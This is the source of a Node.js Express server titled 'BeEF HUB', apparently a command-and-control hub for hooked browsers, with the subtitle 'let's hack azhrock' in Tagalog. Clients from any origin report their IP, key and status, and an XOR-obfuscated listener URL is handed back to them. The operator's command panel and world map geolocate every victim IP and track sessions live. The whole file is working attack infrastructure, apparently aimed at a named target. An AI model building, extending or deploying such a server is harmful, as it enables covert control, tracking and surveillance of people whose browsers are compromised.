const express = require("express");
const fs      = require("fs");
const path    = require("path");
const cors    = require("cors");

const app          = express();
const PORT         = process.env.PORT || 3000;
const ROUTE_JSON   = path.join(__dirname, "api", "route.json");
const SESSION_JSON = path.join(__dirname, "api", "sessions.json");

function ensureJson(filePath, defaultValue) {
  if (!fs.existsSync(filePath)) {
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2));
  }
}

ensureJson(ROUTE_JSON,   { listener: null });
ensureJson(SESSION_JSON, []);

const corsOptions = {
  origin: "*",
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type"]
};

app.use(cors(corsOptions));
app.options("*", cors(corsOptions));
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const sseClients = new Set();

fs.watch(SESSION_JSON, { persistent: true }, (eventType) => {
  if (eventType !== "change") return;
  clearTimeout(fs.watch._debounce);
  fs.watch._debounce = setTimeout(() => {
    try {
      const raw  = fs.readFileSync(SESSION_JSON, "utf8");
      const data = JSON.parse(raw);
      broadcast(data);
    } catch (_) {}
  }, 80);
});

function broadcast(data) {
  const payload = `event: sessions\ndata: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach(res => {
    try { res.write(payload); } catch (_) { sseClients.delete(res); }
  });
}

app.get("/api/sessions/stream", (req, res) => {
  res.setHeader("Content-Type",  "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection",    "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();

  try {
    const raw  = fs.readFileSync(SESSION_JSON, "utf8");
    const data = JSON.parse(raw);
    res.write(`event: sessions\ndata: ${JSON.stringify(data)}\n\n`);
  } catch (_) {
    res.write(`event: sessions\ndata: []\n\n`);
  }

  const heartbeat = setInterval(() => {
    try { res.write(": heartbeat\n\n"); } catch (_) { clearInterval(heartbeat); }
  }, 25000);

  sseClients.add(res);

  req.on("close", () => {
    sseClients.delete(res);
    clearInterval(heartbeat);
  });
});

app.get("/api/sessions.json", (req, res) => {
  try {
    res.json(JSON.parse(fs.readFileSync(SESSION_JSON, "utf8")));
  } catch (_) {
    res.json([]);
  }
});

app.post("/api/sessions", (req, res) => {
  const incoming = req.body;

  const entry = Array.isArray(incoming) ? incoming[0] : incoming;

  if (!entry || typeof entry !== "object" || !entry.Client) {
    return res.status(400).json({ error: "Expected an object with at least a Client field" });
  }

  try {
    let sessions = [];
    try {
      sessions = JSON.parse(fs.readFileSync(SESSION_JSON, "utf8"));
    } catch (_) {}

    const ip     = entry.Client;
    const isDead = String(entry.Status || "").toLowerCase() === "dead";
    const idx    = sessions.findIndex(s => s.Client === ip);

    if (isDead) {
      if (idx !== -1) sessions.splice(idx, 1);
    } else if (idx !== -1) {
      sessions[idx] = {...sessions[idx], ...entry, lastSeen: Date.now()};
    } else {
      sessions.push({...entry, lastSeen: Date.now()});
    }

    fs.writeFileSync(SESSION_JSON, JSON.stringify(sessions, null, 2));

    res.json({
      ok: true,
      action: isDead ? "deleted" : idx !== -1 ? "updated" : "inserted",
      count: sessions.length
    });
  } catch (err) {
    console.error("Session upsert error:", err);
    res.status(500).json({ error: "Could not write sessions.json" });
  }
});

app.get("/", (req, res) => {
  let listener = null;
  try {
    const raw = fs.readFileSync(ROUTE_JSON, "utf8");
    listener = JSON.parse(raw).listener ?? null;
  } catch (_) {}

  res.setHeader("Content-Type", "text/html");
  res.send(renderPage(listener));
});

app.get("/commandpanel", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "Commandpanel.html"));
});

app.get("/worldmap", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "Worldmap.html"));
});

app.get("/api/route.json", (req, res) => {
  try {
    res.json(JSON.parse(fs.readFileSync(ROUTE_JSON, "utf8")));
  } catch (_) {
    res.json({ listener: null });
  }
});

app.post("/api/route", (req, res) => {
  const { FROM, KEY, STATUS } = req.body;

  const Client =
    (req.headers["x-forwarded-for"] || "")
      .split(",")[0]
      .trim() ||
    req.socket.remoteAddress ||
    req.body.Client;

  if (!Client) {
    return res
      .status(400)
      .json({ error: "Could not resolve Client IP" });
  }

  try {
    let routeData = { listener: null };

    try {
      routeData = JSON.parse(
        fs.readFileSync(ROUTE_JSON, "utf8")
      );
    } catch (_) {}

    let sessions = [];

    try {
      sessions = JSON.parse(
        fs.readFileSync(SESSION_JSON, "utf8")
      );
    } catch (_) {}

    const idx = sessions.findIndex(
      s => s.Client === Client
    );

    const isDead =
      String(STATUS || "").toLowerCase() === "dead";

    if (isDead) {
      if (idx !== -1) {
        sessions.splice(idx, 1);
      }
    } else {
      const session = {
        FROM,
        Client,
        KEY,
        STATUS: STATUS || "active",
        lastSeen: Date.now()
      };

      if (idx !== -1) {
        sessions[idx] = session;
      } else {
        sessions.push(session);
      }
    }

    fs.writeFileSync(
      SESSION_JSON,
      JSON.stringify(sessions, null, 2)
    );

    res.json(routeData);
  } catch (err) {
    console.error(err);

    res.status(500).json(routeData);
  }
});

app.post("/api/set-listener", (req, res) => {
  const { hashedUrl } = req.body;
  if (!hashedUrl || typeof hashedUrl !== "string")
    return res.status(400).json({ error: "hashedUrl is required" });

  try {
    let data = {};
    try { data = JSON.parse(fs.readFileSync(ROUTE_JSON, "utf8")); } catch (_) {}
    data.listener = hashedUrl;
    fs.writeFileSync(ROUTE_JSON, JSON.stringify(data, null, 2));
    res.json({ ok: true, listener: hashedUrl });
  } catch (err) {
    res.status(500).json({ error: "Could not write route.json" });
  }
});

// ─────────────────────────────────────────────────────────────────────────────
// GEO PROXY  —  paste this block into server.js
//
// Requires node-fetch v2 if you are on Node < 18:
//   npm install node-fetch@2
//
// On Node 18+ the built-in fetch is available — remove the require line below.
// ─────────────────────────────────────────────────────────────────────────────

const fetch    = require("node-fetch");   // remove if Node 18+
const GEO_JSON = path.join(__dirname, "api", "geo-cache.json");

// Bootstrap the cache file
ensureJson(GEO_JSON, { resetAt: null, entries: {} });

function loadGeoCache() {
  try { return JSON.parse(fs.readFileSync(GEO_JSON, "utf8")); }
  catch (_) { return { resetAt: null, entries: {} }; }
}

function saveGeoCache(cache) {
  fs.writeFileSync(GEO_JSON, JSON.stringify(cache, null, 2));
}

// Daily noon reset — clears all cached IPs at 12:00 PM server local time
function scheduleNoonReset() {
  const now  = new Date();
  const noon = new Date(now);
  noon.setHours(12, 0, 0, 0);
  if (now >= noon) noon.setDate(noon.getDate() + 1);

  const msUntilNoon = noon - now;

  setTimeout(() => {
    const cache   = loadGeoCache();
    cache.entries = {};
    cache.resetAt = new Date().toISOString();
    saveGeoCache(cache);
    console.log("[geo-cache] daily reset at noon —", cache.resetAt);
    scheduleNoonReset();
  }, msUntilNoon);

  console.log(`[geo-cache] next reset in ${Math.round(msUntilNoon / 60000)} min`);
}

scheduleNoonReset();

app.get("/api/geo/:ip", async (req, res) => {
  const ip = req.params.ip;

  const isLocal =
    ip === "127.0.0.1" || ip === "localhost" || ip === "::1" ||
    ip.startsWith("192.168.") || ip.startsWith("10.") ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(ip);

  if (isLocal) {
    return res.json({
      lat: 14.5995, lng: 120.9842,
      city: "localhost", country: "LAN",
      org: "Local Network", languages: "n/a",
      cached: false, fixed: true,
    });
  }

  // Return from cache if present — no external request made
  const cache = loadGeoCache();
  if (cache.entries[ip]) {
    console.log(`[geo-cache] HIT  ${ip}`);
    return res.json({ ...cache.entries[ip], cached: true });
  }

  // Cache miss — fetch from ipapi.co
  console.log(`[geo-cache] MISS ${ip} — fetching from ipapi.co`);
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, {
      headers: { "User-Agent": "cccp-server/1.0" },
    });

    const d = await r.json();

    // Detect rate-limit: HTTP 429 or error payload from ipapi.co
    if (r.status === 429 || d.error || String(d.reason || "").toLowerCase().includes("limit")) {
      console.warn(`[geo-cache] rate-limited for ${ip}`);
      return res.json({
        lat: 0, lng: 0,
        city: "?", country: "?", org: "?", languages: "?",
        rateLimited: true, cached: false,
      });
    }

    if (d.latitude && d.longitude) {
      const entry = {
        lat:       +d.latitude,
        lng:       +d.longitude,
        city:      d.city         || "Unknown",
        country:   d.country_name || "Unknown",
        org:       d.org          || "",
        languages: d.languages    || "",
        cached:    false,
      };

      cache.entries[ip] = entry;
      saveGeoCache(cache);

      return res.json(entry);
    }

    return res.status(502).json({
      lat: 0, lng: 0, city: "?", country: "?",
      org: "?", languages: "?", failed: true, cached: false,
    });

  } catch (err) {
    console.error(`[geo-cache] fetch error for ${ip}:`, err.message);
    return res.status(502).json({
      lat: 0, lng: 0, city: "?", country: "?",
      org: "?", languages: "?", failed: true, cached: false,
    });
  }
});

app.listen(PORT, () => {
  console.log(`BeEF HUB → http://localhost:${PORT}`);
  console.log(`Sessions  → http://localhost:${PORT}/sessions`);
});

setInterval(() => {
  try {
    let sessions = [];

    try {
      sessions = JSON.parse(
        fs.readFileSync(SESSION_JSON, "utf8")
      );
    } catch (_) {
      return;
    }

    const now = Date.now();

    const activeSessions = sessions.filter(
      session => now - (session.lastSeen || 0) < 60000
    );

    if (activeSessions.length !== sessions.length) {
      fs.writeFileSync(
        SESSION_JSON,
        JSON.stringify(activeSessions, null, 2)
      );
    }
  } catch (err) {
    console.error("Session cleanup error:", err);
  }
}, 10000);

function renderPage(listener) {
  const savedBadge = listener
    ? `<div class="saved-badge" id="savedBadge">
         <span class="badge-dot"></span>
         <span>listener active</span>
         <code>${escHtml(listener)}</code>
       </div>`
    : `<div class="saved-badge inactive" id="savedBadge">
         <span class="badge-dot"></span>
         <span>no listener set</span>
       </div>`;

  return /* html */ `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BeEF HUB</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --bg: #0a0a0f;
      --surface: #111118;
      --surface2: #1a1a24;
      --border: #2a2a38;
      --accent: #7b6ef6;
      --accent2: #e06cff;
      --text: #f0eeff;
      --muted: #7070a0;
      --success: #4ade80;
      --danger: #f87171;
      --mono: 'Space Mono', monospace;
      --sans: 'Syne', sans-serif;
    }

    body {
      background: var(--bg);
      color: var(--text);
      font-family: var(--sans);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 2rem 1rem;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background-image:
        linear-gradient(var(--border) 1px, transparent 1px),
        linear-gradient(90deg, var(--border) 1px, transparent 1px);
      background-size: 48px 48px;
      opacity: 0.35;
      pointer-events: none;
      z-index: 0;
    }

    body::after {
      content: '';
      position: fixed;
      top: -200px;
      left: 50%;
      transform: translateX(-50%);
      width: 700px;
      height: 500px;
      background: radial-gradient(ellipse, rgba(123,110,246,0.18) 0%, transparent 70%);
      pointer-events: none;
      z-index: 0;
    }

    .container {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 640px;
    }

    .header { margin-bottom: 2.5rem; animation: fadeUp 0.6s ease both; }

    .tag {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      font-family: var(--mono);
      font-size: 11px;
      letter-spacing: 0.12em;
      text-transform: uppercase;
      color: var(--accent);
      border: 1px solid rgba(123,110,246,0.35);
      padding: 4px 12px;
      border-radius: 100px;
      margin-bottom: 1rem;
    }

    .tag::before {
      content: '';
      width: 6px; height: 6px;
      border-radius: 50%;
      background: var(--accent);
      animation: pulse 2s infinite;
    }

    h1 {
      font-size: clamp(2rem, 5vw, 3rem);
      font-weight: 800;
      line-height: 1.1;
      letter-spacing: -0.02em;
      background: linear-gradient(135deg, var(--text) 40%, var(--accent2));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .subtitle {
      margin-top: 0.5rem;
      font-family: var(--mono);
      font-size: 13px;
      color: var(--muted);
    }

    .card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 2rem;
      display: flex;
      flex-direction: column;
      gap: 1.5rem;
      animation: fadeUp 0.6s 0.1s ease both;
      position: relative;
      overflow: hidden;
    }

    .card::before {
      content: '';
      position: absolute;
      top: 0; left: 0; right: 0;
      height: 1px;
      background: linear-gradient(90deg, transparent, var(--accent), transparent);
      opacity: 0.6;
    }

    .field { display: flex; flex-direction: column; gap: 8px; }

    label {
      font-family: var(--mono);
      font-size: 11px;
      letter-spacing: 0.1em;
      text-transform: uppercase;
      color: var(--muted);
    }

    textarea, input[type="text"] {
      background: var(--surface2);
      border: 1px solid var(--border);
      border-radius: 10px;
      color: var(--text);
      font-family: var(--mono);
      font-size: 14px;
      padding: 14px 16px;
      transition: border-color 0.2s, box-shadow 0.2s;
      outline: none;
      width: 100%;
    }

    textarea { resize: vertical; min-height: 100px; line-height: 1.6; }

    textarea:focus, input[type="text"]:focus {
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(123,110,246,0.15);
    }

    textarea::placeholder, input::placeholder { color: var(--muted); opacity: 0.6; }

    .divider {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .divider::before, .divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: var(--border);
    }

    .divider span {
      font-family: var(--mono);
      font-size: 11px;
      color: var(--muted);
      letter-spacing: 0.08em;
    }

    .output-label-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .output-box {
      background: var(--surface2);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 14px 16px;
      font-family: var(--mono);
      font-size: 13px;
      color: var(--accent);
      word-break: break-all;
      min-height: 72px;
      line-height: 1.7;
      transition: border-color 0.3s;
    }

    .output-box.has-value { border-color: rgba(123,110,246,0.4); }

    .empty-hint { color: var(--muted); opacity: 0.5; font-size: 12px; }

    /* Button row */
    .btn-row {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
    }

    .btn {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      border: none;
      border-radius: 10px;
      color: #fff;
      font-family: var(--mono);
      font-size: 13px;
      font-weight: 700;
      padding: 12px 22px;
      cursor: pointer;
      transition: opacity 0.2s, transform 0.15s;
    }

    .btn:hover { opacity: 0.88; }
    .btn:active { transform: scale(0.97); }
    .btn svg { width: 15px; height: 15px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

    .btn-copy { background: linear-gradient(135deg, var(--accent), var(--accent2)); }
    .btn-copy.copied { background: linear-gradient(135deg, #1a6e3c, #2da55e); }

    .btn-set { background: linear-gradient(135deg, #1e3a5f, #2563eb); }
    .btn-set.saving { background: linear-gradient(135deg, #3d2a00, #d97706); }
    .btn-set.saved  { background: linear-gradient(135deg, #14532d, #16a34a); }
    .btn-set.error  { background: linear-gradient(135deg, #450a0a, #dc2626); }

    /* Saved badge (SSR pre-rendered) */
    .saved-badge {
      display: flex;
      align-items: center;
      gap: 8px;
      font-family: var(--mono);
      font-size: 11px;
      color: var(--success);
      background: rgba(74,222,128,0.08);
      border: 1px solid rgba(74,222,128,0.25);
      border-radius: 8px;
      padding: 10px 14px;
      word-break: break-all;
      line-height: 1.5;
    }

    .saved-badge.inactive {
      color: var(--muted);
      background: rgba(112,112,160,0.08);
      border-color: rgba(112,112,160,0.2);
    }

    .badge-dot {
      width: 7px; height: 7px;
      border-radius: 50%;
      background: currentColor;
      flex-shrink: 0;
      animation: pulse 2s infinite;
    }

    .saved-badge.inactive .badge-dot { animation: none; }

    .saved-badge code {
      display: block;
      margin-top: 4px;
      font-size: 11px;
      color: var(--accent);
      word-break: break-all;
    }

    .footer-note {
      display: flex;
      align-items: center;
      gap: 8px;
      font-family: var(--mono);
      font-size: 11px;
      color: var(--muted);
      animation: fadeUp 0.6s 0.2s ease both;
      margin-top: 1rem;
    }

    .footer-note::before {
      content: '';
      display: inline-block;
      width: 6px; height: 6px;
      border-radius: 50%;
      background: var(--muted);
      flex-shrink: 0;
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(16px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="tag">Route Cipher</div>
      <h1>BeEF Hub</h1>
      <p class="subtitle">//hack naten si azhrock</p>
    </div>

    <div class="card">
      <div class="field">
        <label for="inputText">Input text</label>
        <textarea id="inputText" placeholder="Paste your plaintext here…"></textarea>
      </div>

      <div class="field">
        <label for="inputKey">Secret key</label>
        <input type="text" id="inputKey" placeholder="Enter encryption key…" />
      </div>

      <div class="divider"><span>encoded output</span></div>

      <div class="field">
        <div class="output-label-row">
          <label>Result</label>
        </div>
        <div class="output-box" id="outputBox">
          <span class="empty-hint">Output will appear here…</span>
        </div>
      </div>

      <div class="btn-row">
        <button class="btn btn-copy" id="copyBtn" onclick="copyOutput()">
          <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
          Copy to clipboard
        </button>

        <button class="btn btn-set" id="setBtn" onclick="setListener()">
          <svg viewBox="0 0 24 24"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
          Set
        </button>
      </div>

      <!-- SSR-rendered listener status -->
      ${savedBadge}
    </div>

    <p class="footer-note">Output is base64-encoded XOR cipher — symmetric, use the same key to decode.</p>
  </div>

  <script>
    /* ── XOR encode ─────────────────────────────────────────────── */
    function xorEncode(text, key) {
      let result = "";
      for (let i = 0; i < text.length; i++) {
        result += String.fromCharCode(
          text.charCodeAt(i) ^ key.charCodeAt(i % key.length)
        );
      }
      return btoa(result);
    }

    function updateOutput() {
      const text = document.getElementById("inputText").value;
      const key  = document.getElementById("inputKey").value;
      const box  = document.getElementById("outputBox");

      if (!text || !key) {
        box.innerHTML = '<span class="empty-hint">Output will appear here…</span>';
        box.classList.remove("has-value");
      } else {
        box.textContent = xorEncode(text, key);
        box.classList.add("has-value");
      }
    }

    /* ── Copy ───────────────────────────────────────────────────── */
    function copyOutput() {
      const box = document.getElementById("outputBox");
      const btn = document.getElementById("copyBtn");
      if (!box.classList.contains("has-value")) return;

      navigator.clipboard.writeText(box.textContent).then(() => {
        btn.innerHTML = \`<svg viewBox="0 0 24 24" style="width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round"><polyline points="20 6 9 17 4 12"/></svg> Copied!\`;
        btn.classList.add("copied");
        setTimeout(() => {
          btn.innerHTML = \`<svg viewBox="0 0 24 24" style="width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy to clipboard\`;
          btn.classList.remove("copied");
        }, 2200);
      });
    }

    /* ── Set listener ───────────────────────────────────────────── */
    async function setListener() {
      const box = document.getElementById("outputBox");
      const btn = document.getElementById("setBtn");
      const badge = document.getElementById("savedBadge");

      if (!box.classList.contains("has-value")) {
        btn.textContent = "No output yet";
        setTimeout(() => resetSetBtn(), 1800);
        return;
      }

      const hashedUrl = box.textContent.trim();

      // Saving state
      btn.innerHTML = \`<svg viewBox="0 0 24 24" style="width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Saving…\`;
      btn.classList.add("saving");

      try {
        const res = await fetch("/api/set-listener", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ hashedUrl })
        });

        const json = await res.json();

        if (!res.ok) throw new Error(json.error || "Request failed");

        // Success state
        btn.innerHTML = \`<svg viewBox="0 0 24 24" style="width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round"><polyline points="20 6 9 17 4 12"/></svg> Saved!\`;
        btn.classList.remove("saving");
        btn.classList.add("saved");

        // Update badge in-place (no full-page reload)
        badge.className = "saved-badge";
        badge.innerHTML = \`
          <span class="badge-dot"></span>
          <span>listener active</span>
          <code>\${escHtml(json.listener)}</code>
        \`;

        setTimeout(() => resetSetBtn(), 2200);

      } catch (err) {
        btn.textContent = "Error — " + err.message;
        btn.classList.remove("saving");
        btn.classList.add("error");
        setTimeout(() => resetSetBtn(), 2500);
      }
    }

    function resetSetBtn() {
      const btn = document.getElementById("setBtn");
      btn.innerHTML = \`<svg viewBox="0 0 24 24" style="width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg> Set\`;
      btn.className = "btn btn-set";
    }

    function escHtml(str) {
      return str.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
    }

    document.getElementById("inputText").addEventListener("input", updateOutput);
    document.getElementById("inputKey").addEventListener("input", updateOutput);
  </script>
</body>
</html>`;
}

function escHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}